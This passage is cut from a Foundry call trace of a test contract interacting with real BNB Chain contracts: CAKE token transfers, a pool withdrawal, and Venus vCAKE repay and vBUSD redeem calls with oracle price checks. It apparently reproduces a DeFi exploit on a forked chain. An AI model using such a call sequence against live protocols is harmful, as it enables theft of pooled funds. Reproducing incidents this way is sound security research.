    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3583] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::burn(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x0000000000000000000000000000000000000000, value: 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Withdraw(user: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, pid: 0, amount: 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 79993711372133184166803 [7.999e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [23183] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0x489afbAED0Ea796712c9A6d366C16CA3876D8184, 79913717660761050982637 [7.991e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, value: 79913717660761050982637 [7.991e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 79913717660761050982637 [7.991e22]
    тФВ   тФВ   тФВ   тФЬтФА [23183] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 79913717660761050982637 [7.991e22])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 79913717660761050982637 [7.991e22])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [24586] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [40643] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::repayBorrow(50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФЬтФА [39260] 0x13f816511384D3534783241ddb5751c4b7a7e148::repayBorrow(50000000000000000000000 [5e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [18991] 0xfD36E2c2a6789Db23113685031d7F16329158384::repayBorrowAllowed(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [18305] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::repayBorrowAllowed(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [387] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::borrowIndex() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1619704391197731712 [1.619e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(0xfD36E2c2a6789Db23113685031d7F16329158384) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 15396713908246186889020790 [1.539e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5578] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3127] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::delegateToImplementation(0x95dd91930000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1470] 0x13f816511384D3534783241ddb5751c4b7a7e148::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50000000000000000000000 [5e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000a968163f0a57b400000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50000000000000000000000 [5e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit DistributedBorrowerVenus(param0: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1017424650376490276210676717354177449 [1.017e36])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3400596464865196778065127 [3.4e24]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [5994] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, value: 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, value: 115792089237316195423570985008687907853269984665640563989457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3450596464865196778065127 [3.45e24]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit RepayBorrow(payer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], repayAmount: 50000000000000000000000 [5e22], accountBorrows: 0, totalBorrows: 2156257282327781762350568 [2.156e24])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [1018] 0xfD36E2c2a6789Db23113685031d7F16329158384::repayBorrowVerify(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22], 1619704391197731712 [1.619e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [399] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::repayBorrowVerify(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22], 1619704391197731712 [1.619e18]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФЬтФА [134342] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::redeemUnderlying(400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФЬтФА [133537] 0x13f816511384D3534783241ddb5751c4b7a7e148::redeemUnderlying(400000000000000000000000 [4e23]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111563712666643952909666939 [1.115e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [89493] 0xfD36E2c2a6789Db23113685031d7F16329158384::redeemAllowed(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [88803] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::redeemAllowed(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1842280795285372 [1.842e15]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [72596] 0x370053C7fA8C85C994d9d7b8732fEDF2b9B06447::getHypotheticalAccountLiquidity(0xfD36E2c2a6789Db23113685031d7F16329158384, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 1842280795285372 [1.842e15], 0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2100] 0xfD36E2c2a6789Db23113685031d7F16329158384::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1393] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7096] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5571] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3686] 0x13f816511384D3534783241ddb5751c4b7a7e148::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111563712666643952909666939 [1.115e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 1842280795285372 [1.842e15], 0, 217122167817007095976741999 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068b8b6c61277c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b399684d564c8bca26cc6f
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 1842280795285372 [1.842e15], 0, 217122167817007095976741999 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1550] 0xfD36E2c2a6789Db23113685031d7F16329158384::markets(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [855] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::markets(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 800000000000000000 [8e17], true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 800000000000000000 [8e17], true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1182] 0xfD36E2c2a6789Db23113685031d7F16329158384::oracle() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [514] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::oracle() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [14173] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F::getUnderlyingPrice(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1122] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "vBUSD"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [470] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::underlying() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1081] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "BUSD"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1140] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2137] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1141] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100004889 [1e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100004889 [1e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1000048890000000000 [1e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8419] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5571] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3686] 0x13f816511384D3534783241ddb5751c4b7a7e148::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3450596464865196778065127 [3.45e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 0, 0, 260582773673731278274850545 [2.605e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d78c8c776a70af40586ef1
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 0, 0, 260582773673731278274850545 [2.605e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1550] 0xfD36E2c2a6789Db23113685031d7F16329158384::markets(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [855] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::markets(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 550000000000000000 [5.5e17], false
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 550000000000000000 [5.5e17], false
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1182] 0xfD36E2c2a6789Db23113685031d7F16329158384::oracle() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [514] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::oracle() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [14086] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F::getUnderlyingPrice(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1144] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "vCAKE"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [383] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::underlying() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1081] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "Cake"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1140] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [298] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2137] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1141] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [403] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 4941592920000000000 [4.941e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1230] 0xfD36E2c2a6789Db23113685031d7F16329158384::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [559] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(0xfD36E2c2a6789Db23113685031d7F16329158384) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 15396713908246186889020790 [1.539e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3581] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2145] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [488] 0x13f816511384D3534783241ddb5751c4b7a7e148::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1842280795285372 [1.842e15]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000068b8b6c61277c
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1842280795285372 [1.842e15]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit DistributedSupplierVenus(param0: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1411194283732082232551454911018101020363731 [1.411e42])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
